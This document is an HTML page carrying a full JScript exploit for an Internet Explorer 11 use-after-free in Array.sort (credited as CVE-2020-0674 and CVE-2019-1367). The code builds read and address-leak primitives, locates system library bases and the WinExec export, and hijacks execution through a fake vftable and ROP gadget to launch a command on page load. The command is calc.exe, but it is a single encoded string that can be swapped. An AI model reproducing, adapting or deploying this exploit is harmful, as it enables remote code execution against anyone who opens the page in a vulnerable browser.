<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
        <script language="JScript.Compact">
// -------------------------------------------------------------------------------------------------
//
// Credits:
//    maxpl0it (@maxpl0it) - writing CVE-2020-0674
//    ty. - writing CVE-2019-1367, using the same trick
//
// Vulnerability: Use-After-Free when Array.sort() is called with a comparator function. The arguments[0]
//                                                 are untracked by the garbage collector.
//
// Testing:
//    OS tested on: Windows 7 x86
//    IE versions tested on: 11
//
// ------------------------------------------------------------------------------------------------------


// write_debug: Used to show debugging output.
function write_debug(str_to_write) {
    if(debug) { // Switch is below
        try{
            console.log(str_to_write); // In IE, console only works if devtools is open.
        } catch(e) {
            try {
                alert(str_to_write); // A lot of popups but provides information.
            } catch(e) {
                // Otherwise, nothing.
            }
        }
    }
}


// Globals
var depth; // Used to track the depth of the recursion for the exploit function.
var spray; // Used to spray objects and fill GcBlocks.
var overlay; // Used to hold objects that will eventually contain properties that will reallocate freed GcBlocks.
var overlay_backup; // Used to make sure that the overlay objects still have a reference after the exploit is done. Otherwise they would be freed and reallocated.
var variants; // A string that contains a bunch of fake VAR structures. This is the property name that will cause the freed GcBlock to be reallocated.
var total; // Used to hold the untracked variable pointers for the use-after-free.
var leak_addr; // Holds the least significant DWORD of the 'next VVAL' pointer leak.
var leak_offset; // Since we don't want to free all overlay variables, this value will be used to identify which property we have got a pointer for so only this will be freed and reallocated later.
var leak_verify_var; // Used to verify that the rewrite worked. If the overlay cannot be freed and reallocated, then the exploit will not work.
var fakeobj_var; // Points at the property name string in the final VVAL. When the property name changes, a fake VAR is constructed in the name string and will change this fakeobj_var's type and object pointer values.
var trigger_obj; // Will contain the fake object and vftable.
var context; // Will store the context structure for NtContinue.
var padding = "AAAAAAAAAAA"; // Padding aligns so that the property with the manipulated hash will end up on top of an untracked var.
var leak = "\u0005"; // This manipulates the hash of the VVAL.
var leaked_var = "A"; // The final object property name. Needs to be created so that the 'next VVAL' pointer of the manipulated hash VVAL is filled.
var spray_size = 20000; // The size of the spray array.
var overlay_size = 20000; // The size of the overlay array.
var pad_size = 3000; // The size of padding for the trigger object. This padding adds additional space for functions like WinExec() to add their stack frames and the stack frames of the functions they call.
var sort = new Array(); // The array to be sorted with the vulnerable function.
var lfh = new Array(); // An array used to trigger lfh.
var debug = false; // Whether write_debug will do anything.
var command = "\u3a43\u575c\u6e69\u6f64\u7377\u535c\u7379\u6574\u336d\u5c32\u6163\u636c\u652e\u6578"; // The command to be executed. In this case it's "C:\Windows\System32\calc.exe"


// Setup - fills the sort array with arrays to be sorted. Done first to avoid the stack setup getting messed up.
for(i = 0; i < 310; i++) sort[i] = [0,0];


// lfh_trigger: Used to trigger LFH for a particular size.
// gcblock_size = 0x648
function lfh_trigger() {
	var name1 = Array(377).join('A');
    for(i = 0; i < 50; i++) {
        tmp = new Object();
        tmp[name1] = 1;
        lfh.push(tmp);
    }
}

// reset: Resets the objects used in the function initial_exploit so it could be used again.
function reset(){
    depth = 0;
    spray = new Array();
    overlay = new Array();
    total = new Array();
    for(i = 0; i < overlay_size; i++) overlay[i] = new Object(); // Overlay must happen before spray
    for(i = 0; i < spray_size; i++)
	{
		spray[i] = new Object();
		spray[i]['aaa'] = i; 
	}
    CollectGarbage();
}


// make_variant: Creates a fake VAR in a string.
function make_variant(type, obj_ptr, next_ptr)
{
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr & 0xffff, (obj_ptr >> 16) & 0xffff,
         // next_ptr
        next_ptr & 0xffff, (next_ptr >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}


// set_variants: A wrapper for make_variant that allocates and pads the property names to align the fake VARs correctly in memory.
function set_variants(type, obj_ptr, next_ptr) {
    variants = "AA";
    for(i=0; i < 46; i++) {
        variants += make_variant(type, obj_ptr, next_ptr);
    }
    variants += "AAAAAA";
}


// initial_exploit: The main exploit function.
function initial_exploit() {
    arguments[0] = spray[depth];
    if(depth > 200) {
        spray = new Array(); // Erase spray
        CollectGarbage(); // Add to free
        for(i = 0; i < overlay_size; i++) {
            overlay[i][variants] = 1;
            overlay[i][padding] = 1;
            overlay[i][leak] = 1;
            overlay[i][leaked_var] = i; // Used to identify which leak is being used
        }
        total.push(arguments[0]);
        return 0;
    }
    // Set pointers
    depth += 1;
	sort[depth].sort(initial_exploit);
    total.push(arguments[0]);
    return 0;
}




// rewrite: Frees the correct overlay object and reallocate over it as to replace the object at the leaked 'next property' pointer.
function rewrite(v, i){
	total = new Array();
    CollectGarbage(); // Get rid of anything lingering that might screw up the exploit
    overlay_backup[leak_offset] = null; // Erase the object to be replaced
    CollectGarbage(); // Clear leak
    overlay_backup[leak_offset] = new Object(); // New object - Might end up in the same slot as the last object
    overlay_backup[leak_offset][variants] = 1; // Re-allocate the newly freed location (Take up the original GcBlock location again)
    overlay_backup[leak_offset][padding] = 1; // Add padding to align the hash with the type to leak the 'next property' pointer
    overlay_backup[leak_offset][leak] = 1; // The hash-manipulating property
    overlay_backup[leak_offset][v] = i; // sets the property name and the initial VAR
}


// read_pointer: Rewrites the property and changes the fakeobj_var variable to a string at a specified location. This sets up the read primitive.
function read_pointer(addr, o) {
    rewrite(make_variant(8, addr), o);
}


// read_byte: Reads the byte at the address using the length of the BSTR.
function read_byte(addr, o) {
    read_pointer(addr + 2, o); // Use the length. However, when the length is found, it is divided by 2 (BSTR_LENGTH >> 1) so changing this offset allows us to read a byte properly.
    return (fakeobj_var.length >> 15) & 0xff; // Shift to align and get the byte.
}


// read_word: Reads the WORD (2 bytes) at the specified address.
function read_word(addr, o) {
    read_pointer(addr + 2, o);
    return ((fakeobj_var.length >> 15) & 0xff) + (((fakeobj_var.length >> 23) & 0xff) << 8);
}


// read_dword: Reads the DWORD (4 bytes) at the specified address.
function read_dword(addr, o) {
    read_pointer(addr + 2, o);
    lower = ((fakeobj_var.length >> 15) & 0xff) + (((fakeobj_var.length >> 23) & 0xff) << 8);
    read_pointer(addr + 4, o);
    upper = ((fakeobj_var.length >> 15) & 0xff) + (((fakeobj_var.length >> 23) & 0xff) << 8);
    return lower + (upper << 16);
}


// test_read: Used to test whether the arbitrary read works. leak_addr + 64 points to the fakeobj_var location (property name string). The byte at this address is therefore expected to be 8 (String VAR type).
function test_read() {
    if(read_byte(leak_addr + 48) != 8) {
        throw Error("Arbitrary read failed.");
    }
}


// test_fakeobj: Used to test whether fakeoj_var responds as expected when the type and value is changed.
function test_fakeobj() {
	// alert('[+] test_fakeobj');
    rewrite(make_variant(3, 23));
	
    if(fakeobj_var + "" != 23) { // Turning it to a string causes the conversion to copy, dereferencing the 0x80 type. Type 0x80 being used directly won't work.
        throw Error("Couldn't re-write fakeobj variable");
    }
}


// test_rewrite: Used to test whether the VAR in the VVAL leaked address changes as expected.
function test_rewrite() {
    rewrite(leaked_var, 23);
    if(leak_verify_var + "" != 23) {
        throw Error("Couldn't re-write variable");
    }
}


// addrof: The 'address-of' primitive. Changes the VAR at the start of the VVAL to point to a given object and changes the fakeobj_var string to point to the object pointer of this VAR, thus allowing the address to be read.
function addrof(o) {
    var_addr = read_dword(leak_addr + 8, o); // Dereference the first VAR
    return read_dword(var_addr + 8, 1); // Get the Object pointer of the second VAR
}
function leak_gc(o){
	var_addr = read_dword(leak_addr + 8, o);
	return read_dword(var_addr, 1);
}

// find_module_base: Finds the base of a module from a leaked pointer. Works by zeroing the least significant 16 bits of the address and subtracting 0x10000 until the DOS stub code is found at a specified offset.
function find_module_base(ptr) {
    ptr = (ptr & 0xFFFF0000) + 0x4e; // Set to starting search point
    while(true) {
        if(read_dword(ptr) == 0x73696854) { // The string 'This'
            write_debug("[+] Found module base!");
            ptr -= 0x4e; // Subtract the offset to get the base
			write_debug("[+] base:" + ptr.toString(16));
            return ptr;
        }
        ptr -= 0x10000;
    }
}


// leak_jscript_base: Gets the base of the jscript module by creating a new object, following the object pointers until the vftable is found, and then using the vftable leak to identify the base of jscript.dll.
function leak_jscript_base() {
    // Create an object to leak vftable
    obj = new Object();

    // Get address of the object pointer
    obj_ptr_addr = addrof(obj);
    write_debug("[+] Object ptr at 0x" + obj_ptr_addr.toString(16));

    // Get address of the vftable
    vftable_addr = read_dword(obj_ptr_addr, 1);
    write_debug("[+] Vftable at 0x" + vftable_addr.toString(16));

    return find_module_base(vftable_addr);
}


// leak_var: Executes the main exploit function in order to leak a 'next property' pointer. 
function leak_var() {
    reset();
    variants = Array(377).join('A'); // Create the variants
	sort[depth].sort(initial_exploit);
	overlay_backup = overlay; // Prevent it from being freed and losing our leaked pointer
    leak_addr = undefined;
    for(i = 0; i < total.length; i++) {
		// alert(i.toString(10) + (typeof total[i]));
        if(typeof total[i] === "number" && total[i] % 1 != 0) {
            leak_addr = (total[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            break;
        }
    }
}


// get_rewrite_offset: Executes the main exploit function again in order to create a number of fake VARs that point to the leaked location. This means that the object pointer can be read and the exact offset of the leaked property in the overlay array can be identified.
function get_rewrite_offset() {
    reset();
    set_variants(0x80, leak_addr);  // Find the number of the object
    sort[depth].sort(initial_exploit); // Exploit
    //JSON.stringify(sort[depth]);
	for(i = 0; i < total.length; i++) {
        if(typeof total[i] === "number") {
            leak_offset = parseInt(total[i] + "");
            leak_verify_var = total[i];
            break;
        }
    }
}


// get_fakeobj: Identifies the fakeobj_var.
function get_fakeobj() {
    rewrite(make_variant(3, 1234)); // Turn the name of the property into a variant
	// alert('[+] check_fakeobj');
    reset();
    set_variants(0x80, leak_addr + 48);  // Create a fake VAR pointing to the name of the property
    sort[depth].sort(initial_exploit); // Exploit
    //JSON.stringify(sort[depth]);
	for(i = 0; i < total.length; i++) {
        if(typeof total[i] === "number") {
            if(total[i] + "" == 1234) {
                fakeobj_var = total[i];
                break;
            }
        }
    }
}


// leak_module: Used to leak a pointer for a given module that is imported by another module by traversing the PE structure in-memory.
function leak_module(base, target_name_lower, target_name_upper) {
    // Get IMAGE_NT_HEADERS pointer
    module_addr = base + 0x3c; // PE Header offset location
    file_addr = read_dword(module_addr, 1);
    // write_debug("[+] PE Header offset = 0x" + file_addr.toString(16));

    // Get imports
    module_addr = base + file_addr + 0x80; // Import Directory offset location
    import_dir = read_dword(module_addr, 1);
    // write_debug("[+] Import offset = 0x" + import_dir.toString(16));

    // Get import size
    module_addr = base + file_addr + 0x84; // Import Directory offset location
    import_size = read_dword(module_addr, 1);
    // write_debug("[+] Size of imports = 0x" + import_size.toString(16));

    // Find module
    module_addr = base + import_dir;
	// write_debug("[+] Import dir addr = 0x" + module_addr.toString(16));
    while(import_size != 0) {
        name_ptr = read_dword(module_addr + 0xc, 1); // 0xc is the offset to the module name pointer
        if(name_ptr == 0) {
            throw Error("Couldn't find the target module name");
        }
        name_lower = read_dword(base + name_ptr);
        name_upper = read_dword(base + name_ptr + 4);
        if(name_lower == target_name_lower && name_upper == target_name_upper) {
            write_debug("[+] Found the module! Leaking a random module pointer...");
            iat = read_dword(module_addr + 0x10); // Import Address Table
            leaked_address = read_dword(base + iat);
            write_debug("[+] Leaked address at 0x" + leaked_address.toString(16));
            return leaked_address;
        }
        import_size -= 0x14; // The size of each entry
        module_addr += 0x14; // Increase entry pointer
    }
}


// leak_export: Finds the location of a given exported function in a module. Works using binary search in order to speed it up. Assumes that the export name order is alphabetical.
function leak_export(base, target_name_first, target_name_second, target_name_third, target_name_fourth) {
    // Get IMAGE_NT_HEADERS pointer
	// debug = true;
    module_addr = base + 0x3c; // PE Header offset location
    file_addr = read_dword(module_addr, 1);
    write_debug("[+] PE Header offset at 0x" + file_addr.toString(16));

    // Get exports
    module_addr = base + file_addr + 0x78; // Export Directory offset location
    export_dir = read_dword(module_addr, 1);
    write_debug("[+] Export offset at 0x" + import_dir.toString(16));

    // Get the number of exports
    module_addr = base + export_dir + 0x14; // Number of items offset
    export_num = read_dword(module_addr, 1);
    write_debug("[+] Export count is " + export_num);

    // Get the address offset
    module_addr = base + export_dir + 0x1c; // Address offset
    addresses = read_dword(module_addr, 1);
    write_debug("[+] Export address offset at 0x" + addresses.toString(16));

    // Get the names offset
    module_addr = base + export_dir + 0x20; // Names offset
    names = read_dword(module_addr, 1);
    write_debug("[+] Export names offset at 0x" + names.toString(16));

    // Get the ordinals offset
    module_addr = base + export_dir + 0x24; // Ordinals offset
    ordinals = read_dword(module_addr, 1);
    write_debug("[+] Export ordinals offset at 0x" + ordinals.toString(16));

    // Binary search because linear search is too slow
    upper_limit = export_num; // Largest number in search space
    lower_limit = 0; // Smallest number in search space
    num_pointer = Math.floor(export_num/2);
    module_addr = base + names;
    search_complete = false;

    while(!search_complete) {
        module_addr = base + names + 4*num_pointer; // Point to the name string offset
        function_str_offset = read_dword(module_addr, 0); // Get the offset to the name string
        module_addr = base + function_str_offset; // Point to the string
        function_str_lower = read_dword(module_addr, 0); // Get the first 4 bytes of the string
        res = compare_nums(target_name_first, function_str_lower);
        if(!res && target_name_second) {
            function_str_second = read_dword(module_addr + 4, 0); // Get the next 4 bytes of the string
            res = compare_nums(target_name_second, function_str_second);
            if(!res && target_name_third) {
                function_str_third = read_dword(module_addr + 8, 0); // Get the next 4 bytes of the string
                res = compare_nums(target_name_third, function_str_third);
                if(!res && target_name_fourth) {
                    function_str_fourth = read_dword(module_addr + 12, 0); // Get the next 4 bytes of the string
                    res = compare_nums(target_name_fourth, function_str_fourth);
                }
            }
        }
        if(!res) { // equal
            module_addr = base + ordinals + 2*num_pointer;
            ordinal = read_word(module_addr, 0);
            module_addr = base + addresses + 4*ordinal;
            function_offset = read_dword(module_addr, 0);
            write_debug("[+] Found target export at offset 0x" + function_offset.toString(16));
            return base + function_offset;
        } if(res == 1) {
            if(upper_limit == num_pointer) {
                throw Error("Failed to find the target export.");
            }
            upper_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + lower_limit) / 2);
        } else {
            if(lower_limit == num_pointer) {
                throw Error("Failed to find the target export.");
            }
            lower_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + upper_limit) / 2);
        }
        if(num_pointer == upper_limit && num_pointer == lower_limit) {
            throw Error("Failed to find the target export.");
        }
    }
    throw Error("Failed to find matching export.");
}


// compare_nums: Compares two numbers that represent 4-byte strings for equality. If not, it detects which character is larger or smaller.
function compare_nums(target, current) { // return -1 for target being greater, 0 for equal, 1 for current being greater
    write_debug("[*] Comparing 0x" + target.toString(16) + " and 0x" + current.toString(16));
    if(target == current) {
        write_debug("[+] Equal!");
        return 0;
    }
    while(target != 0 && current != 0) {
        if((target & 0xff) > (current & 0xff)) {
            return -1;
        } else if((target & 0xff) < (current & 0xff)) {
            return 1;
        }
        target = target >> 8;
        current = current >> 8;
    }
}


// generate_gadget_string: Takes a gadget address and creates a string from it.
function generate_gadget_string(gadget) {
    return String.fromCharCode.apply(null, [gadget & 0xffff, (gadget >> 16) & 0xffff]);
}


// generate_obj_vftable: Creates a fake object with a fake vftable containing a few ROP gadgets.
function generate_obj_vftable(rop, exec, cmd) {
    trigger_obj = Array(pad_size + 1).join('A'); // Adds lots of stack space to either side to prevent msvcrt.dll crashing
    trigger_obj = trigger_obj + generate_gadget_string(exec) + generate_gadget_string(0x41414141)+generate_gadget_string(cmd) + generate_gadget_string(1);
	trigger_obj = trigger_obj + Array(71).join('A') + generate_gadget_string(rop);
    trigger_obj = trigger_obj.substr(0, trigger_obj.length);
    trigger_addr = string_addr(trigger_obj);
    write_debug("[+] Trigger object at 0x" + trigger_addr.toString(16));
    return trigger_addr;
}


// leak_stack_ptr: Leaks a stack pointer in order to avoid stack pivot detection in the CONTEXT structure.
function leak_stack_ptr() {
    leak_obj = new Object(); // Create an object
    obj_addr = addrof(leak_obj); // Get address
    csession_addr = read_dword(obj_addr + 0xC, 1); // Get CSession from offset 24
    stack_addr = read_dword(csession_addr + 0x2C, 1); // Get the stack pointer
    return stack_addr;
}


// string_addr: Gets the address of a string in an object that can be used in a chain.
function string_addr(string_to_get) {
    return addrof(string_to_get);
}

function ty_trigger(base, exec, cmd)
{
	// alert('rop' + (base + 0x149e6).toString(16));
	addr = generate_obj_vftable(base + 0x149e6, exec, cmd);
	// test
	rewrite(make_variant(0x81, leak_addr + 0x48, 0) + make_variant(0, addr + 2 * (pad_size), 0));
	typeof fakeobj_var;
}

// main: The entire exploit.
function main(){
    // Setup functions
    lfh_trigger(); // Trigger LFH - May or may not make the exploit more reliable, but can't hurt

    // Leak VAR
    leak_var();

    // Identify offset for reliable rewrite
    get_rewrite_offset();

    // Test rewrite
    test_rewrite();

    // Create a fake VAR
    get_fakeobj();

    // Test fakeobj rewrite
    test_fakeobj();

    // Output results so far
    write_debug("[+] Leaked address 0x" + leak_addr.toString(16) + " is at offset " + leak_offset);

    // Test read
    test_read();

    // Get the module base for jscript
    jscript_base = leak_jscript_base();

    // Get the msvcrt base by following the jscript import table
    mscvcrt_leak = leak_module(jscript_base, 0x6376736d, 0x642e7472);
    msvcrt_base = find_module_base(mscvcrt_leak);

    // Get the ntdll base by following the msvcrt import table
    ntdll_leak = leak_module(msvcrt_base, 0x6c64746e, 0x6c642e6c);
    ntdll_base = find_module_base(ntdll_leak);

    // Get the kernel32 base by following the jscript import table
    kernel32_leak = leak_module(jscript_base, 0x4e52454b, 0x32334c45);
    kernel32_base = find_module_base(kernel32_leak);

    // Find the WinExec function address from kernel32
    kernel32_winexec_export = leak_export(kernel32_base, 0x456e6957, 0, 0, 0);

    // Find the NtContinue function address from ntdll
    ntdll_ntcontinue_export = leak_export(ntdll_base, 0x6f43744e, 0x6e69746e, 0, 0);

    // Get the address of the command to be executed
    command_address = string_addr(command);

    // trigger exec
	ty_trigger(msvcrt_base, kernel32_winexec_export, command_address);
}


// Call main()
main();
        </script>
    </head>
</html>
